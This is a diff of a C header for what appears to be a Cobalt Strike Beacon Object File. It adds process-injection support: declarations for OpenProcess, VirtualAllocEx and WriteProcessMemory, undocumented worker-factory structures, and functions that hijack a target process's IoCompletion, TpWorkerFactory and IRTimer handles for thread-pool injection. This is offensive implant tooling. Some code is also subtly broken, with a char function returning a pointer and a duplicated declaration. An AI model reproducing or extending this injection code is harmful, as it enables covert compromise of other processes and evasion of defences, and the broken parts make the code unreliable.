@@ -2,7 +2,10 @@
 
 #include <windows.h>
 #include <stdint.h>
+#include <stdio.h>
 #include <winternl.h>
+
+#include "../_include/beacon.h"
 
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
@@ -22,10 +25,38 @@
        WORKER_FACTORY_SHUTDOWN \
 )
 
-WINBASEAPI void *__cdecl MSVCRT$realloc(void *_Memory, size_t _NewSize);
-WINBASEAPI wchar_t *__cdecl MSVCRT$wcscmp(const wchar_t *_lhs,const wchar_t *_rhs);
-WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess (VOID);
-WINBASEAPI BOOL WINAPI KERNEL32$DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
+WINBASEAPI BOOL         WINAPI   KERNEL32$AssignProcessToJobObject(HANDLE hJob, HANDLE hProcess);
+WINBASEAPI BOOL         WINAPI   KERNEL32$DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
+WINBASEAPI BOOL         WINAPI   KERNEL32$ReadProcessMemory(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T);
+WINBASEAPI BOOL         WINAPI   KERNEL32$SetEvent(HANDLE);
+WINBASEAPI BOOL         WINAPI   KERNEL32$SetInformationJobObject(HANDLE hJob, JOBOBJECTINFOCLASS JobObjectInformationClass, LPVOID lpJobObjectInformation, DWORD cbJobObjectInformationLength);
+WINBASEAPI BOOL         WINAPI   KERNEL32$VirtualProtectEx(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
+WINBASEAPI BOOL         WINAPI   KERNEL32$VirtualProtectEx(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
+WINBASEAPI BOOL         WINAPI   KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
+WINBASEAPI BOOL         WINAPI   KERNEL32$WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
+WINBASEAPI HANDLE       WINAPI   KERNEL32$CloseHandle(HANDLE);
+WINBASEAPI HANDLE       WINAPI   KERNEL32$CreateEventW(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCWSTR);
+WINBASEAPI HANDLE       WINAPI   KERNEL32$CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
+WINBASEAPI HANDLE       WINAPI   KERNEL32$CreateJobObjectA(LPSECURITY_ATTRIBUTES lpJobAttributes, LPCSTR lpName);
+WINBASEAPI HANDLE       WINAPI   KERNEL32$GetCurrentProcess (VOID);
+WINBASEAPI HANDLE       WINAPI   KERNEL32$OpenProcess (DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
+WINBASEAPI LPVOID       WINAPI   KERNEL32$VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+WINBASEAPI PTP_IO       WINAPI   KERNEL32$CreateThreadpoolIo( HANDLE fl, PTP_WIN32_IO_CALLBACK pfnio, PVOID pv, PTP_CALLBACK_ENVIRON pcbe);
+WINBASEAPI PTP_TIMER    WINAPI   KERNEL32$CreateThreadpoolTimer( PTP_TIMER_CALLBACK pfnti, PVOID pv, PTP_CALLBACK_ENVIRON pcbe);
+WINBASEAPI PTP_WAIT     WINAPI   KERNEL32$CreateThreadpoolWait(PTP_WAIT_CALLBACK pfnwa, PVOID pv, PTP_CALLBACK_ENVIRON pcbe);
+WINBASEAPI PTP_WORK     WINAPI   KERNEL32$CreateThreadpoolWork(PTP_WORK_CALLBACK, PVOID, PTP_CALLBACK_ENVIRON);
+
+WINBASEAPI int          WINAPI   MSVCRT$rand(void);
+WINBASEAPI time_t       WINAPI   MSVCRT$time(time_t *seconds);
+WINBASEAPI void         WINAPI   MSVCRT$srand(unsigned int seed);
+WINBASEAPI void*        WINAPI   MSVCRT$calloc(size_t number, size_t size);
+WINBASEAPI void*        WINAPI   MSVCRT$malloc(size_t size);
+
+WINBASEAPI wchar_t     *__cdecl  MSVCRT$wcscmp(const wchar_t *_lhs,const wchar_t *_rhs);
+WINBASEAPI errno_t      __cdecl  MSVCRT$wcscat_s(wchar_t *_Dst, rsize_t _DstSize, const wchar_t *_Src);
+WINBASEAPI errno_t      __cdecl  MSVCRT$wcscpy_s(wchar_t *_Dst, rsize_t _DstSize, const wchar_t *_Src);
+WINBASEAPI void        *__cdecl  MSVCRT$realloc(void *_Memory, size_t _NewSize);
+WINBASEAPI size_t       __cdecl  MSVCRT$wcslen(const wchar_t *_Str);
 
 typedef struct _TP_TASK_CALLBACKS
 {
@@ -528,19 +559,19 @@ typedef struct _ALPC_PORT_ASSOCIATE_COMPLETION_PORT
 // private
 typedef enum _ALPC_PORT_INFORMATION_CLASS
 {
-    AlpcBasicInformation,
-    AlpcPortInformation,
-    AlpcAssociateCompletionPortInformation,
-    AlpcConnectedSIDInformation,
-    AlpcServerInformation,
-    AlpcMessageZoneInformation,
-    AlpcRegisterCompletionListInformation,
-    AlpcUnregisterCompletionListInformation,
-    AlpcAdjustCompletionListConcurrencyCountInformation,
-    AlpcRegisterCallbackInformation,
-    AlpcCompletionListRundownInformation,
+    AlpcBasicInformation, // q: out ALPC_BASIC_INFORMATION
+    AlpcPortInformation, // s: in ALPC_PORT_ATTRIBUTES
+    AlpcAssociateCompletionPortInformation, // s: in ALPC_PORT_ASSOCIATE_COMPLETION_PORT
+    AlpcConnectedSIDInformation, // q: in SID
+    AlpcServerInformation, // q: inout ALPC_SERVER_INFORMATION
+    AlpcMessageZoneInformation, // s: in ALPC_PORT_MESSAGE_ZONE_INFORMATION
+    AlpcRegisterCompletionListInformation, // s: in ALPC_PORT_COMPLETION_LIST_INFORMATION
+    AlpcUnregisterCompletionListInformation, // s: VOID
+    AlpcAdjustCompletionListConcurrencyCountInformation, // s: in ULONG
+    AlpcRegisterCallbackInformation, // s: ALPC_REGISTER_CALLBACK // kernel-mode only
+    AlpcCompletionListRundownInformation, // s: VOID // 10
     AlpcWaitForPortReferences,
-    AlpcServerSessionInformation
+    AlpcServerSessionInformation // q: ALPC_SERVER_SESSION_INFORMATION // since 19H2
 } ALPC_PORT_INFORMATION_CLASS;
 
 
@@ -579,8 +610,8 @@ typedef struct _PORT_MESSAGE
     ULONG MessageId;
     union
     {
-        SIZE_T ClientViewSize;
-        ULONG CallbackId;
+        SIZE_T ClientViewSize; // only valid for LPC_CONNECTION_REQUEST messages
+        ULONG CallbackId; // only valid for LPC_REQUEST messages
     };
 } PORT_MESSAGE, * PPORT_MESSAGE;
 typedef struct _ALPC_MESSAGE {
@@ -614,6 +645,90 @@ typedef struct _FILE_COMPLETION_INFORMATION
     PVOID Key;
 } FILE_COMPLETION_INFORMATION, * PFILE_COMPLETION_INFORMATION;
 
+typedef enum _EXTENDED_FILE_INFORMATION_CLASS {
+    r_FileDirectoryInformation = 1,
+    r_FileFullDirectoryInformation,
+    r_FileBothDirectoryInformation,
+    r_FileBasicInformation,
+    r_FileStandardInformation,
+    r_FileInternalInformation,
+    r_FileEaInformation,
+    r_FileAccessInformation,
+    r_FileNameInformation,
+    r_FileRenameInformation,
+    r_FileLinkInformation,
+    r_FileNamesInformation,
+    r_FileDispositionInformation,
+    r_FilePositionInformation,
+    r_FileFullEaInformation,
+    r_FileModeInformation,
+    r_FileAlignmentInformation,
+    r_FileAllInformation,
+    r_FileAllocationInformation,
+    r_FileEndOfFileInformation,
+    r_FileAlternateNameInformation,
+    r_FileStreamInformation,
+    r_FilePipeInformation,
+    r_FilePipeLocalInformation,
+    r_FilePipeRemoteInformation,
+    r_FileMailslotQueryInformation,
+    r_FileMailslotSetInformation,
+    r_FileCompressionInformation,
+    r_FileObjectIdInformation,
+    r_FileCompletionInformation,
+    r_FileMoveClusterInformation,
+    r_FileQuotaInformation,
+    r_FileReparsePointInformation,
+    r_FileNetworkOpenInformation,
+    r_FileAttributeTagInformation,
+    r_FileTrackingInformation,
+    r_FileIdBothDirectoryInformation,
+    r_FileIdFullDirectoryInformation,
+    r_FileValidDataLengthInformation,
+    r_FileShortNameInformation,
+    r_FileIoCompletionNotificationInformation,
+    r_FileIoStatusBlockRangeInformation,
+    r_FileIoPriorityHintInformation,
+    r_FileSfioReserveInformation,
+    r_FileSfioVolumeInformation,
+    r_FileHardLinkInformation,
+    r_FileProcessIdsUsingFileInformation,
+    r_FileNormalizedNameInformation,
+    r_FileNetworkPhysicalNameInformation,
+    r_FileIdGlobalTxDirectoryInformation,
+    r_FileIsRemoteDeviceInformation,
+    r_FileUnusedInformation,
+    r_FileNumaNodeInformation,
+    r_FileStandardLinkInformation,
+    r_FileRemoteProtocolInformation,
+    r_FileRenameInformationBypassAccessCheck,
+    r_FileLinkInformationBypassAccessCheck,
+    r_FileVolumeNameInformation,
+    r_FileIdInformation,
+    r_FileIdExtdDirectoryInformation,
+    r_FileReplaceCompletionInformation,
+    r_FileHardLinkFullIdInformation,
+    r_FileIdExtdBothDirectoryInformation,
+    r_FileDispositionInformationEx,
+    r_FileRenameInformationEx,
+    r_FileRenameInformationExBypassAccessCheck,
+    r_FileDesiredStorageClassInformation,
+    r_FileStatInformation,
+    r_FileMemoryPartitionInformation,
+    r_FileStatLxInformation,
+    r_FileCaseSensitiveInformation,
+    r_FileLinkInformationEx,
+    r_FileLinkInformationExBypassAccessCheck,
+    r_FileStorageReserveIdInformation,
+    r_FileCaseSensitiveInformationForceAccessCheck,
+    r_FileKnownFolderInformation,
+    r_FileStatBasicInformation,
+    r_FileId64ExtdDirectoryInformation,
+    r_FileId64ExtdBothDirectoryInformation,
+    r_FileIdAllExtdDirectoryInformation,
+    r_FileIdAllExtdBothDirectoryInformation,
+    r_FileMaximumInformation
+ } EXTENDED_FILE_INFORMATION_CLASS, *PEXTENDED_FILE_INFORMATION_CLASS;
 
 typedef NTSTATUS(NTAPI* _NtSetInformationFile)(
     HANDLE FileHandle,
@@ -622,7 +737,6 @@ typedef NTSTATUS(NTAPI* _NtSetInformationFile)(
     ULONG Length,
     FILE_INFORMATION_CLASS FileInformationClass
     );
-
 
 BYTE* NtQueryObject_(HANDLE x, OBJECT_INFORMATION_CLASS y) {
     _NtQueryObject NtQueryObject = (_NtQueryObject)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryObject"));
@@ -637,6 +751,47 @@ BYTE* NtQueryObject_(HANDLE x, OBJECT_INFORMATION_CLASS y) {
 
     return Information;
 }
+
+typedef enum _SET_WORKERFACTORYINFOCLASS
+{
+    WorkerFactoryTimeout = 0,
+    WorkerFactoryRetryTimeout = 1,
+    WorkerFactoryIdleTimeout = 2,
+    WorkerFactoryBindingCount = 3,
+    WorkerFactoryThreadMinimum = 4,
+    WorkerFactoryThreadMaximum = 5,
+    WorkerFactoryPaused = 6,
+    WorkerFactoryAdjustThreadGoal = 8,
+    WorkerFactoryCallbackType = 9,
+    WorkerFactoryStackInformation = 10,
+    WorkerFactoryThreadBasePriority = 11,
+    WorkerFactoryTimeoutWaiters = 12,
+    WorkerFactoryFlags = 13,
+    WorkerFactoryThreadSoftMaximum = 14,
+    WorkerFactoryMaxInfoClass = 15 /* Not implemented */
+} SET_WORKERFACTORYINFOCLASS, * PSET_WORKERFACTORYINFOCLASS;
+
+typedef NTSTATUS(NTAPI* _NtSetInformationWorkerFactory)(
+    HANDLE hTpWorkerFactory,
+    SET_WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
+    PVOID WorkerFactoryInformation,
+    ULONG WorkerFactoryInformationLength
+    );
+
+typedef NTSTATUS(NTAPI* _ZwAssociateWaitCompletionPacket)(
+    HANDLE WaitCopmletionPacketHandle,
+    HANDLE IoCompletionHandle,
+    HANDLE TargetObjectHandle,
+    PVOID KeyContext,
+    PVOID ApcContext,
+    NTSTATUS IoStatus,
+    ULONG_PTR IoStatusInformation,
+    PBOOLEAN AlreadySignaled
+    );
+
+HANDLE hIoCompletion = NULL;
+HANDLE hTpWorkerFactory = NULL;
+HANDLE hIRTimer = NULL;
 
 HANDLE HijackProcessHandle(PWSTR wsObjectType, HANDLE p_hTarget, DWORD dwDesiredAccess) {
     _NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess"));
@@ -676,4 +831,60 @@ HANDLE HijackProcessHandle(PWSTR wsObjectType, HANDLE p_hTarget, DWORD dwDesired
 
         return p_hDuplicatedObject;
     }
+}
+
+HANDLE HijackTargetThreadPoolHandle(PWSTR wsObjectType, HANDLE processHandle, DWORD dwDesiredAccess) {
+    return HijackProcessHandle(wsObjectType, processHandle, dwDesiredAccess);
+}
+
+HANDLE GetTargetThreadPoolHandle(PWSTR wsObjectType, HANDLE processHandle, DWORD dwDesiredAccess) {
+    HANDLE hTargetThreadPoolHandle = HijackTargetThreadPoolHandle(wsObjectType, processHandle, dwDesiredAccess);
+    return hTargetThreadPoolHandle;
+}
+
+void HijackIoCompletionHandle(HANDLE processHandle, DWORD dwDesiredAccess) {
+    hIoCompletion = GetTargetThreadPoolHandle((PWSTR)L"IoCompletion\0", processHandle, dwDesiredAccess);
+}
+
+void HijackTpWorkerFactoryHandle(HANDLE processHandle, DWORD dwDesiredAccess) {
+    hTpWorkerFactory = GetTargetThreadPoolHandle((PWSTR)L"TpWorkerFactory\0", processHandle, dwDesiredAccess);
+}
+
+void HijackIRTimerHandle(HANDLE processHandle, DWORD dwDesiredAccess) {
+    hIRTimer = GetTargetThreadPoolHandle((PWSTR)L"IRTimer\0", processHandle, dwDesiredAccess);
+}
+
+WORKER_FACTORY_BASIC_INFORMATION GetWorkerFactoryBasicInformation() {
+    WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };
+    _NtQueryInformationWorkerFactory NtQueryInformationWorkerFactory = (_NtQueryInformationWorkerFactory)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationWorkerFactory"));
+    NtQueryInformationWorkerFactory(hTpWorkerFactory, WorkerFactoryBasicInformation, &WorkerFactoryInformation, sizeof(WorkerFactoryInformation), NULL);
+    return WorkerFactoryInformation;
+}
+
+char generateRandomLetter() {
+    int randomNumber = MSVCRT$rand() % 26;
+    char randomLetter = 'A' + randomNumber;
+    return randomLetter;
+}
+
+char generateRandomLetters(int length) {
+    char* randomLetters = (char*)MSVCRT$malloc((length + 1) * sizeof(char));
+    for (int i = 0; i < length; ++i) {
+        randomLetters[i] = generateRandomLetter();
+    }
+    randomLetters[length] = '\0';
+    return randomLetters;
+}
+
+wchar_t generateRandomLetterW() {
+    return L'A' + MSVCRT$rand() % 26;
+}
+
+wchar_t* generateRandomLettersW(int length) {
+    wchar_t* randomLetters = (wchar_t*)MSVCRT$malloc((length + 1) * sizeof(wchar_t));
+    for (int i = 0; i < length; ++i) {
+        randomLetters[i] = generateRandomLetterW();
+    }
+    randomLetters[length] = L'\0';
+    return randomLetters;
 }
